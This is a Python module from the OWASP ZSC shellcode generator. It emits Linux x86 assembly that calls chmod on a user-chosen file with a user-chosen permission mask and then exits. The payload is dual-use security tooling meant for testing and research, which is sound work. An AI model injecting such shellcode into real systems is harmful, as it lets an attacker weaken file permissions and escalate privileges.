"""
OWASP ZSC
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/zscproject/OWASP-ZSC
http://api.z3r0d4y.com/
https://groups.google.com/d/forum/owasp-zsc [ owasp_zsc[at]googlegroups[dot]com ]
"""
from owasp_zsc.new_cores import base_module
from owasp_zsc.cores import stack


# from owasp_zsc.lib.opcoder.linux_x86 import convert


class Module(base_module.BaseModule):
    perm = base_module.OptString("", "Permission mask")  # TODO improve descr
    file_dest = base_module.OptString("", "File Target")  # TODO improve descr

    def generate(self):
        payload = "push $0x0f\n"
        payload += "pop %%eax\n"
        payload += stack.generate(self.perm, '%ecx', 'int')
        payload += stack.generate(self.file_dest, '%ebx', 'string')
        payload += "mov %%esp,%%ebx\n"
        payload += "int $0x80\n"
        payload += "mov $0x01,%%al\n"
        payload += "mov $0x01,%%bl\n"
        payload += "int $0x80"
        return payload

    def run(self):
        if not self.perm or not self.file_dest: # TODO fix here by module_required
            print("Option is required")
        else:
            print(self.generate())  # TODO set write file or print here
